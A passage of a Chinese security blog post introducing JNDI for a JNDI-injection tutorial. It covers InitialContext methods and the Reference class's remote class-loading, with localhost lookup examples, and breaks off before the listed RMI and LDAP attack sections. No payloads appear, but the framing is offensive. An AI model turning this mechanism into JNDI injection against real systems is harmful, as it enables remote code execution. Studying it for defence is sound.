<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="en">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>JNDI注入-基础 - 东隅 Blog</title><meta name="author" content="东隅">
<meta name="author-link" content="">
<meta name="description" content="" /><meta name="keywords" content='代码审计, java安全' />
  <meta itemprop="name" content="JNDI注入-基础">
  <meta itemprop="datePublished" content="2024-09-02T17:33:01+08:00">
  <meta itemprop="dateModified" content="2024-09-02T17:33:01+08:00">
  <meta itemprop="wordCount" content="1323">
  <meta itemprop="keywords" content="代码审计,Java安全"><meta property="og:url" content="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/jndi%E6%B3%A8%E5%85%A5-%E5%9F%BA%E7%A1%80/">
  <meta property="og:site_name" content="东隅 Blog">
  <meta property="og:title" content="JNDI注入-基础">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-09-02T17:33:01+08:00">
    <meta property="article:modified_time" content="2024-09-02T17:33:01+08:00">
    <meta property="article:tag" content="代码审计">
    <meta property="article:tag" content="Java安全">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="JNDI注入-基础">
<meta name="application-name" content="FixIt">
<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/jndi%E6%B3%A8%E5%85%A5-%E5%9F%BA%E7%A1%80/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-jdk7u21/" /><link rel="next" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "JNDI注入-基础",
    "inLanguage": "en",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/java%E5%AE%89%E5%85%A8\/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/jndi%E6%B3%A8%E5%85%A5-%E5%9F%BA%E7%A1%80\/"
    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, java安全","wordcount":  1323 ,
    "url": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/java%E5%AE%89%E5%85%A8\/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/jndi%E6%B3%A8%E5%85%A5-%E5%9F%BA%E7%A1%80\/","datePublished": "2024-09-02T17:33:01+08:00","dateModified": "2024-09-02T17:33:01+08:00","publisher": {
      "@type": "Organization",
      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
        "@type": "Person",
        "name": "东隅"
      },"description": ""
  }
  </script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a
                class="menu-link"
                href="/posts/"
                
                
              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/categories/"
                
                
              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/tags/"
                
                
              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/posts/"
                  
                  
                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/tags/"
                  
                  
                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">JNDI注入-基础</li>
    </ol>
  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>JNDI注入-基础</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2024-09-02 17:33:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-09-02">2024-09-02</time></span>&nbsp;<span title="1323 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1400 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>7 minutes</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Contents</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#jndi定义">JNDI定义</a>
      <ul>
        <li><a href="#目录中的存储对象">目录中的存储对象</a></li>
        <li><a href="#initialcontext---上下文">InitialContext - 上下文</a></li>
        <li><a href="#reference---引用">Reference - 引用</a></li>
        <li><a href="#jndi示例">JNDI示例</a></li>
      </ul>
    </li>
    <li><a href="#jndi注入">JNDI注入</a>
      <ul>
        <li><a href="#jndi攻击向量">JNDI攻击向量</a></li>
        <li><a href="#jndi-referencermi攻击">JNDI Reference+RMI攻击</a></li>
        <li><a href="#jndi-referenceldap攻击">JNDI Reference+LDAP攻击</a></li>
        <li><a href="#本地-factory">本地 Factory</a></li>
        <li><a href="#serializeddata--ldap攻击">SerializedData + LDAP攻击</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h2 id="jndi定义" class="heading-element"><span>JNDI定义</span>
  <a href="#jndi%e5%ae%9a%e4%b9%89" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><blockquote>
<p>简单的理解： 其实jndi和之前学的rmi很像，rmi需要绑定到注册中心，jndi则是需要绑定到“上下文”，绑定以后原本rmi是只对rmi的东西操作，而jndi它不仅仅支持rmi，还支持其他协议，跟万能接口一样</p>
</blockquote>
<p>JNDI（ Java Naming and Directory Interface，Java命名和目录接口） ，包括==Naming Service==和==Directory Service==，是一组在Java应用中访问命名和目录服务的API。JNDI是Java API，==允许客户端通过名称发现和查找数据、对象==。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），公共对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。</p>
<p>jndi的作用主要在于&quot;定位&quot;。比如定位rmi中注册的对象,访问ldap的目录服务等等</p>
<blockquote>
<p>Naming Service</p>
<p>命名服务是将名称与值相关联的实体，称为&quot;绑定&quot;。它提供了一种使用&quot;find&quot;或&quot;search&quot;操作来根据名称查找对象的便捷方式。 就像DNS一样，通过命名服务器提供服务，大部分的J2EE服务器都含有命名服务器 。例如RMI Registry就是使用的Naming Service。</p>
<p>Directory Service</p>
<p>是一种特殊的Naming Service，它允许存储和搜索&quot;目录对象&quot;，一个目录对象不同于一个通用对象，目录对象可以与属性关联，因此，目录服务提供了对象属性进行操作功能的扩展。一个目录是由相关联的目录对象组成的系统，一个目录类似于数据库，不过它们通常以类似树的分层结构进行组织。可以简单理解成它是一种简化的RDBMS系统，通过目录具有的属性保存一些简单的信息。下面说到的LDAP就是目录服务。</p>
</blockquote>
<p>JNDI自身并不区分客户端和服务器端，也不具备远程能力，但是被其协同的一些其他应用一般都具备远程能力，JNDI在客户端和服务器端都能够进行一些工作，客户端上主要是进行各种访问，查询，搜索，而服务器端主要进行的是帮助管理配置，也就是各种bind。比如在RMI服务器端上可以不直接使用Registry进行bind，而使用JNDI统一管理，当然JNDI底层应该还是调用的Registry的bind，但好处JNDI提供的是统一的配置接口；在客户端也可以直接通过类似URL的形式来访问目标服务，可以看后面提到的<strong>JNDI动态协议转换</strong>。把RMI换成其他的例如LDAP、CORBA等也是同样的道理。</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409021142928.webp" alt="image-20240902114215745" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409021142928.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409021142928.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409021142928.webp?size=large 2x" data-title="image-20240902114215745" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>JNDI由JNDI API、命名管理、JNDI SPI（service provider interface）服务提供的接⼝。我们的应⽤可以通过JNDI的API去访问相关服务提供的接口。我们要使⽤JNDI，必须要有服务提供⽅，我们常⽤的就是JDBC驱动提供数据库连接服务，然后我们配置JNDI连接。</p>
<p>有这么几个关键元素</p>
<ul>
<li>Name，要在命名系统中查找对象，请为其提供对象的<strong>名称</strong></li>
<li>Bind，名称与对象的关联称为绑定，比如在文件系统中文件名绑定到对应的文件，在 DNS 中域名绑定到对应的 IP</li>
<li>Context，上下文，一个上下文中对应着一组<strong>名称到对象的绑定关系</strong>，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文</li>
<li>References，在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为 C中的指针</li>
</ul>
<p>jdk原生支持的:</p>
<ul>
<li>RMI (JAVA远程方法调用)</li>
<li>LDAP (轻量级目录访问协议)</li>
<li>CORBA (公共对象请求代理体系结构)</li>
<li>DNS (域名服务)</li>
</ul>
<p>JDK里提供了5个包，以供JNDI进行功能的实现</p>
<pre tabindex="0"><code>javax.naming：主要用于命名操作,包含了访问目录服务所需的类和接口，比如 Context、Bindings、References、lookup 等。

javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；

javax.naming.event：在命名目录服务器中请求事件通知；

javax.naming.ldap：提供LDAP支持；

javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。</code></pre><p>漏洞中涉及到最多的就是RMI ， LDAP 两种服务接⼝</p>
<h3 id="目录中的存储对象" class="heading-element"><span>目录中的存储对象</span>
  <a href="#%e7%9b%ae%e5%bd%95%e4%b8%ad%e7%9a%84%e5%ad%98%e5%82%a8%e5%af%b9%e8%b1%a1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>官网文档给出定义</p>
<ol>
<li>Java serializable objects</li>
<li><code>Referenceable</code> objects and JNDI <code>References</code></li>
<li>Objects with attributes (<code>DirContext</code>)</li>
<li>RMI objects</li>
<li>CORBA objects</li>
</ol>
<p>比较常见的是 <strong>References引用对象</strong> 和 <strong>RMI远程对象</strong></p>
<h3 id="initialcontext---上下文" class="heading-element"><span>InitialContext - 上下文</span>
  <a href="#initialcontext---%e4%b8%8a%e4%b8%8b%e6%96%87" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>构造方法：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//构建一个初始上下文。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">InitialContext</span>() 
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//构造一个初始上下文，并选择不初始化它。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">InitialContext</span>(<span style="color:#ff636f">boolean</span> <span style="color:#58a1dd">lazy</span>) 
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//使用提供的环境构建初始上下文。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">InitialContext</span>(<span style="color:#58a1dd">Hashtable</span><span style="color:#ff636f">&lt;?</span>,<span style="color:#ff636f">?&gt;</span> <span style="color:#58a1dd">environment</span>) </span></span></code></pre></div><p>常用方法：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//将名称绑定到对象。 </span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">bind</span>(<span style="color:#58a1dd">Name</span> <span style="color:#58a1dd">name</span>, <span style="color:#58a1dd">Object</span> <span style="color:#58a1dd">obj</span>) 
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">list</span>(<span style="color:#58a1dd">String</span> <span style="color:#58a1dd">name</span>) 
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//检索命名对象。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">lookup</span>(<span style="color:#58a1dd">String</span> <span style="color:#58a1dd">name</span>)  
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//将名称绑定到对象，覆盖任何现有绑定。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">rebind</span>(<span style="color:#58a1dd">String</span> <span style="color:#58a1dd">name</span>, <span style="color:#58a1dd">Object</span> <span style="color:#58a1dd">obj</span>) 
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//取消绑定命名对象。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">unbind</span>(<span style="color:#58a1dd">String</span> <span style="color:#58a1dd">name</span>)  </span></span></code></pre></div><p>示例</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.naming.InitialContext</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.naming.NamingException</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">jndi</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">main</span>(<span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">args</span>) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">NamingException</span> {
</span></span><span style="display:flex;"><span>      	<span style="color:#828b96;font-style:italic">// 构建初始上下文</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">InitialContext</span> <span style="color:#58a1dd">initialContext</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">InitialContext</span>();
</span></span><span style="display:flex;"><span>      	<span style="color:#828b96;font-style:italic">// 查询命名对象</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">uri</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;rmi://127.0.0.1:1099/work&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">initialContext</span>.<span style="color:#58a1dd">lookup</span>(<span style="color:#58a1dd">uri</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><h3 id="reference---引用" class="heading-element"><span>Reference - 引用</span>
  <a href="#reference---%e5%bc%95%e7%94%a8" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p><code>Reference</code> 类表示对存在于命名/目录系统以外的<strong>对象的引用</strong>，具体则是指如果远程获取 <code>RMI</code> 服务器上的对象为 <code>Reference</code> 类或者其子类时，则可以从其他服务器上加载 <code>class 字节码</code>文件来实例化</p>
<p>构造方法:</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//为类名为“className”的对象构造一个新的引用。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Reference</span>(<span style="color:#58a1dd">String</span> <span style="color:#58a1dd">className</span>) 
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//为类名为“className”的对象和地址构造一个新引用。 </span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Reference</span>(<span style="color:#58a1dd">String</span> <span style="color:#58a1dd">className</span>, <span style="color:#58a1dd">RefAddr</span> <span style="color:#58a1dd">addr</span>) 
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。 </span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Reference</span>(<span style="color:#58a1dd">String</span> <span style="color:#58a1dd">className</span>, <span style="color:#58a1dd">RefAddr</span> <span style="color:#58a1dd">addr</span>, <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">factory</span>, <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">factoryLocation</span>) 
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。  </span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Reference</span>(<span style="color:#58a1dd">String</span> <span style="color:#58a1dd">className</span>, <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">factory</span>, <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">factoryLocation</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">/*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">参数：
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">className 远程加载时所使用的类名
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">factory  加载的class中需要实例化类的名称
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">factoryLocation  提供classes数据的地址可以是file/ftp/http协议
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">*/</span></span></span></code></pre></div><p>示例：</p>
<p>调用完<code>Reference</code>后又调用了<code>ReferenceWrapper</code>将前面的<code>Reference</code>对象给传进去，这是为什么呢？</p>
<p>其实查看<code>Reference</code>就可以知道原因，查看到<code>Reference</code>,并没有实现<code>Remote</code>接口也没有继承 <code>UnicastRemoteObject</code>类</p>
<h3 id="jndi示例" class="heading-element"><span>JNDI示例</span>
  <a href="#jndi%e7%a4%ba%e4%be%8b" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>RMI</p>
<pre tabindex="0"><code>Hashtable env = new Hashtable();
env.put(Context.INITIAL_CONTEXT_FACTORY,
        &#34;com.sun.jndi.rmi.registry.RegistryContextFactory&#34;);
env.put(Context.PROVIDER_URL,
        &#34;rmi://localhost:9999&#34;);
Context ctx = new InitialContext(env);

//将名称refObj与一个对象绑定，这里底层也是调用的rmi的registry去绑定
